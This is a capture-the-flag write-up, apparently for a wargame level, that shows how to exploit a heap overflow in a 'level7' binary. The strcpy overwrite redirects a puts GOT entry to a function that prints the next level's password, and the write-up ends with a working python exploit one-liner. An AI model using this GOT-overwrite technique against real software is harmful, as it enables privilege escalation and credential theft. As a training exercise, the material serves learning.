@@ -1,0 +1,37 @@
+The binary takes 2 arguments, and makes 4 malloc 
+then 2 strcpy of the arg in the second and the 4th malloc.
+After that, the main call fopen who open a file
+stream on the level8's .pass
+then fgets read and store the .pass in a buffer.
+
+The goal is to print this buffer.
+
+There is another function, m who call time printf.
+We can use this to print the pass.
+
+First we have to find the number of char needed to overflow the first strcpy.
+to choose the address where we want to write.
+
+./level7 "abcdefghijklmnopqrstuvwxyz" "test"
+
+With gdb we saw that the second strcpy get the address 0x78777675
+who is the hexa code of "uvwx" in ascii
+
+This mean that we have to overflow with 20 char before insert the address we want to be overwriten.
+Now we need to redirect the program flow to the m function, however we need to wait for fgets to have
+stored the pass in the buffer before we do so.
+
+In order to do that, we can use the call to puts. Being a function from a shared library, it's address
+will be stored in the general offset table (got).
+To find the address of the got:
+
+x/2x 0x8048400
+-> <puts@plt>: 0x992825ff 0x28680804
+We can see from there the got is 0x08049928
+
+x/x 0x08049928
+-> <puts@got.plt>: 0x08048406
+
+Now we simply need to overwrite this address with the address of the m function.
+
+exploit : ./level7 `python -c 'print "a"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
